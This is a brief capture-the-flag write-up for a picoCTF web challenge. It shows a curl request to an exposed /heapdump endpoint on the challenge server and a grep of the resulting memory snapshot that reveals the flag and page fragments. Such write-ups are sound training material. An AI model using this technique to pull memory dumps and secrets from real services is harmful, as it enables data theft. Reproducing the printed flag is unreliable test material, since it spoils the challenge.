Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag.The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server’s memory, where a secret flag is hidden.

Additional details will be available after launching your challenge instance.

1. Explore backend development with us
2. The head was dumped.

## Solucion

```
http://verbal-sleep.picoctf.net:58276/api-docs/

curl -X 'GET' \
  'http://verbal-sleep.picoctf.net:58276/heapdump' \
  -H 'accept: */*'



```



```
cat heapdump-1741490895741.heapsnapshot | grep pico
picoCTF{Pat!3nt_15_Th3_K3y_46022a05}
"picoCTF News API",
"Welcome to the picoCTF News API documentation! This documentation provides a detailed overview of the available API endpoints for managing and retrieving news posts.",
"\nwindow.onload = function() {\n  // Build a system\n  var url = window.location.search.match(/url=([^&]+)/);\n  if (url && url.length > 1) {\n    url = decodeURIComponent(url[1]);\n  } else {\n    url = window.location.origin;\n  }\n  var options = {\n  \"swaggerDoc\": {\n    \"openapi\": \"3.0.0\",\n    \"info\": {\n      \"title\": \"picoCTF News API\",\n      \"version\": \"1.0.0\",\n      \"description\": \"Welcome to the picoCTF News API documentation! This documentation provides a detailed overview of the available API endpoints for managing and retrieving news posts.\"\n    },\n    \"paths\": {\n      \"/\": {\n        \"get\": {\n          \"tags\": [\n            \"Free\"\n          ],\n          \"summary\": \"Welcome page\",\n          \"responses\": {\n            \"200\": {\n              \"description\": \"Returns a welcome message.\"\n            }\n          }\n        }\n      },\n      \"/about\": {\n        \"get\": {\n          \"tags\": [\n            \"Free\"\n          ],\n          \"summary\": \"About Us\",\n          \"responses\": {\n            \"200\": {\n              \"desc",
"<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>picoCTF News</title>\n    <script src=\"https://cdn.tailwindcss.com\"></script>\n</head>\n<body>\n    <div class=\"h-screen overflow-y-scroll bg-white\">\n        <div class=\"grid grid-cols-1 gap-4 lg:grid-cols-3 md:grid-cols-2 lg:gap-8\">\n            <div class=\"post p-5 lg:p-1 rounded-md\">\n                <div class=\"lg:fixed lg:top-7 lg:left-14 lg:w-3/12 md:fixed md:w-5/12\">\n                    <div class=\"bg-white p-8 rounded-lg shadow-md max-w-md w-full mb-4\">\n                        <!-- Banner Profile -->\n                        <div class=\"relative\">\n                            <img src=\"/img/picoctf-logo-og.png\" alt=\"Banner Profile\" class=\"w-full rounded-t-lg\">\n                        </div>\n                        <!-- User Info with Verified Button -->\n                        <div class=\"flex items-center\">\n                            <h2 class=\"text-xl font",
"(function anonymous(locals, escapeFn, include, rethrow\n) {\nvar __line = 1\n  , __lines = \"<!DOCTYPE html>\\n<html lang=\\\"en\\\">\\n<head>\\n    <meta charset=\\\"UTF-8\\\">\\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\">\\n    <title>picoCTF News</title>\\n    <script src=\\\"https://cdn.tailwindcss.com\\\"></script>\\n</head>\\n<body>\\n    <div class=\\\"h-screen overflow-y-scroll bg-white\\\">\\n        <div class=\\\"grid grid-cols-1 gap-4 lg:grid-cols-3 md:grid-cols-2 lg:gap-8\\\">\\n            <div class=\\\"post p-5 lg:p-1 rounded-md\\\">\\n                <div class=\\\"lg:fixed lg:top-7 lg:left-14 lg:w-3/12 md:fixed md:w-5/12\\\">\\n                    <div class=\\\"bg-white p-8 rounded-lg shadow-md max-w-md w-full mb-4\\\">\\n                        <!-- Banner Profile -->\\n                        <div class=\\\"relative\\\">\\n                            <img src=\\\"/img/picoctf-logo-og.png\\\" alt=\\\"Banner Profile\\\" class=\\\"w-full rounded-t-lg\\\">\\n                        </div>\\n                        <!-- User In",
"verbal-sleep.picoctf.net:58276",
"http://verbal-sleep.picoctf.net:58276/api-docs/",

```